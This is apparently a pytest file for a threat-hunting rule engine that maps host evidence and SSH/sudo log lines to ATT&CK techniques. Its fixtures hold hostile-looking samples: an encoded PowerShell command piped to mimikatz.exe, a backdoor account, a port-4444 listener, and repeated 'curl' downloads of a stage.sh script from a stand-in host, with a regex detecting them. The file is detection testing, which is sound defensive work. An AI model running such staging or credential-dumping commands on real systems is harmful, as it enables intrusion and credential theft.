"""Rule-pack and hunting pipeline tests."""

from __future__ import annotations

from hunting.checks import (
    DATA_KEYS,
    baseline_checks,
    collect_data,
    load_baseline,
    normalize_auth_events,
    validate_baseline,
)
from hunting.engine import hunt_vm
from hunting.navigator import build_layer
from hunting.rule_engine import (
    advanced_rule_findings,
    load_attack,
    load_rules,
    run_rule_tests,
    run_rules,
    validate_attack,
    validate_rules,
)


class FakeTransport:
    """Returns canned evidence without opening an SSH connection."""

    last_timeout: int | None = None

    OUTPUTS = {
        "Get-CimInstance": "powershell.exe -enc ZQBjAGgAbw== | C:\\Temp\\mimikatz.exe",
        "Get-Service": "evil-service | Running",
        "Get-ScheduledTask": "Update | powershell.exe -File C:\\Temp\\u.ps1",
        "reg query": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run | updater.exe",
        "net user": "hunter\nbackdoor_admin\n",
        "netstat": "TCP 0.0.0.0:4444 0.0.0.0:0 LISTENING",
    }

    def run(self, command: str, timeout: int = 60) -> str:
        self.last_timeout = timeout
        for fragment, output in self.OUTPUTS.items():
            if fragment in command:
                return output
        return ""


def test_every_embedded_rule_case_passes() -> None:
    failures = [case for case in run_rule_tests() if not case["passed"]]
    assert failures == [], failures


def test_rules_have_required_fields() -> None:
    required = {"id", "target", "pattern", "technique", "severity", "tests"}
    for rule in load_rules():
        assert required.issubset(rule), rule.get("id")


def test_run_rules_enriches_attack_metadata() -> None:
    findings = run_rules({"processes": ["powershell.exe -enc ZQBjAGgAbw=="]})
    assert any(
        item["rule"] == "PS_ENCODED_COMMAND"
        and item["technique"] == "T1059.001"
        and item["tactic"] == "Execution"
        for item in findings
    )


def test_baseline_checks_flag_unknown_process() -> None:
    findings = baseline_checks(
        {"processes": ["evil.exe | C:\\evil.exe"]}, {"processes": ["explorer.exe"]}
    )
    assert len(findings) == 1
    assert findings[0]["rule"] == "BASELINE_NEW_PROCESSES"


def test_hunt_vm_with_fake_transport() -> None:
    baseline = load_baseline()
    report = hunt_vm(
        {"name": "fake-vm", "host": "127.0.0.1", "os": "windows"},
        baseline,
        FakeTransport(),
    )
    assert report["vm"] == "fake-vm"
    assert report["errors"] == []
    assert report["findings"]
    assert report["findings"][0]["severity"] in {
        "critical",
        "high",
        "medium",
        "low",
        "info",
    }
    layer = build_layer(report)
    assert layer["techniques"]
    assert all("techniqueID" in item for item in layer["techniques"])


def test_rule_pack_validates_cleanly() -> None:
    assert validate_rules() == []
    assert validate_attack() == []
    assert load_rules(validate=True)


def test_baseline_loader_is_valid() -> None:
    baseline = load_baseline()
    assert set(DATA_KEYS).issubset(baseline)
    assert validate_baseline(baseline) == []


def test_collect_data_forwards_timeout() -> None:
    transport = FakeTransport()
    data, errors = collect_data(transport, "windows", timeout=7)
    assert errors == []
    assert transport.last_timeout == 7
    assert data["processes"]


def test_listening_port_normalization_prefers_local_address() -> None:
    line = "LISTEN 0 4096 0.0.0.0:22 0.0.0.0:*"
    assert baseline_checks({"listening_ports": [line]}, {"listening_ports": [22]}) == []

    findings = baseline_checks(
        {"listening_ports": ["TCP 0.0.0.0:4444 0.0.0.0:0 LISTENING"]},
        {"listening_ports": [22]},
    )
    assert len(findings) == 1
    assert findings[0]["match"] == "4444"


def test_hunt_vm_defaults_to_repository_baseline() -> None:
    report = hunt_vm(
        {"name": "default-baseline", "host": "127.0.0.1", "os": "windows"},
        transport=FakeTransport(),
    )
    assert report["errors"] == []
    assert report["findings"]


def test_secure_log_rules_consume_normalized_authentication_events() -> None:
    failures = [
        f"Nov 25 10:{12 + index:02d}:34 centos7 sshd[1234]: Failed password for "
        f"invalid user bob from 192.0.2.10 port 43210 ssh2"
        for index in range(6)
    ]
    success = (
        "Nov 25 10:20:01 centos7 sshd[1234]: Accepted password for bob "
        "from 192.0.2.10 port 43212 ssh2"
    )
    data = {"secure_log": normalize_auth_events(failures + [success], "/var/log/secure")}
    errors: list[str] = []
    findings = run_rules(data, baseline=load_baseline(os_type="linux"), errors=errors)

    assert errors == []
    assert any(item["rule"] == "LNX-AUTH-001" for item in findings)
    assert any(item["rule"] == "LNX-AUTH-002" for item in findings)
    brute_force = next(item for item in findings if item["rule"] == "LNX-AUTH-001")
    assert brute_force["match_count"] == 6
    assert brute_force["techniques"] == ["T1110"]


def test_user_creation_rule_consumes_normalized_secure_log() -> None:
    line = (
        "Nov 25 10:31:01 centos7 useradd[1234]: new user: name=svc_backup, "
        "UID=1001, GID=1001, home=/home/svc_backup, shell=/bin/bash"
    )
    data = {"secure_log": normalize_auth_events([line], "/var/log/secure")}
    findings = run_rules(data)

    user_findings = [item for item in findings if item["rule"] == "LNX-USER-001"]
    assert user_findings
    assert user_findings[0]["techniques"] == ["T1136.001"]


def test_sudo_rule_reports_multiple_techniques() -> None:
    lines = [
        (
            f"Nov 25 10:{30 + index:02d}:03 centos7 sudo: pam_unix(sudo:auth): "
            "authentication failure; logname= uid=0 euid=0 tty=pts/0 ruser= rhost=  user=alice"
        )
        for index in range(3)
    ]
    data = {"secure_log": normalize_auth_events(lines, "/var/log/secure")}
    findings = run_rules(data, baseline=load_baseline(os_type="linux"))

    sudo_findings = [item for item in findings if item["rule"] == "LNX-SUDO-001"]
    assert sudo_findings
    assert sudo_findings[0]["severity"] == "high"
    assert sudo_findings[0]["techniques"] == ["T1548.003", "T1110"]


def test_privileged_group_rule_reports_account_manipulation_techniques() -> None:
    line = "Nov 25 10:32:01 centos7 usermod[1239]: add 'alice' to group 'wheel'"
    data = {"secure_log": normalize_auth_events([line], "/var/log/secure")}
    findings = run_rules(data, baseline=load_baseline(os_type="linux"))

    group_findings = [item for item in findings if item["rule"] == "LNX-USER-002"]
    assert group_findings
    assert group_findings[0]["techniques"] == ["T1098.007", "T1098", "T1136.001"]


def test_time_window_rule_rejects_events_outside_window() -> None:
    rules = [
        {
            "rule_id": "WINDOW_TEST",
            "id": "WINDOW_TEST",
            "target": "processes",
            "pattern": r"curl (?P<url>https?://\S+)",
            "technique": "T1071.001",
            "severity": "medium",
            "tests": [],
            "enabled": True,
            "threshold": 3,
            "time_window_minutes": 5,
            "group_by": ["url"],
            "mitre_techniques": ["T1071.001"],
            "detection_type": "time_window",
        }
    ]
    data = {
        "processes": [
            {
                "raw": "2026-11-25T10:00:00Z curl http://192.0.2.10/stage.sh",
                "timestamp": "2026-11-25T10:00:00Z",
            },
            {
                "raw": "2026-11-25T10:02:00Z curl http://192.0.2.10/stage.sh",
                "timestamp": "2026-11-25T10:02:00Z",
            },
            {
                "raw": "2026-11-25T10:20:00Z curl http://192.0.2.10/stage.sh",
                "timestamp": "2026-11-25T10:20:00Z",
            },
        ]
    }
    assert run_rules(data, rules=rules) == []


def test_baseline_comparison_does_not_invent_untrusted_without_baseline() -> None:
    rules = [
        {
            "rule_id": "BASELINE_UNKNOWN",
            "id": "BASELINE_UNKNOWN",
            "target": "users",
            "pattern": "(?!)",
            "technique": "T1136.001",
            "severity": "medium",
            "tests": [],
            "enabled": True,
            "threshold": 1,
            "mitre_techniques": ["T1136.001"],
            "detection_type": "baseline_comparison",
            "requires_baseline": True,
        }
    ]
    data = {"users": ["someuser:x:1000:1000::/home/someuser:/bin/bash"]}
    assert run_rules(data, rules=rules, baseline={}) == []


def test_advanced_rule_engine_contributes_colleague_findings() -> None:
    failed_lines = [
        f"Nov 25 03:4{index}:00 centos-web01 sshd[221{index}]: Failed password "
        "for root from 203.0.113.42 port 40211 ssh2"
        for index in range(6)
    ]
    data = {
        "auth": failed_lines,
        "syslog": ["Nov 25 12:00:00 centos-web01 systemd: Starting Reboot..."],
    }

    findings, errors = advanced_rule_findings(data, load_attack())

    assert errors == []
    assert {item["rule"] for item in findings} >= {"LNX-AUTH-001", "SYS-MSG-001"}
    assert all(item["source"] == "advanced_rule_engine" for item in findings)
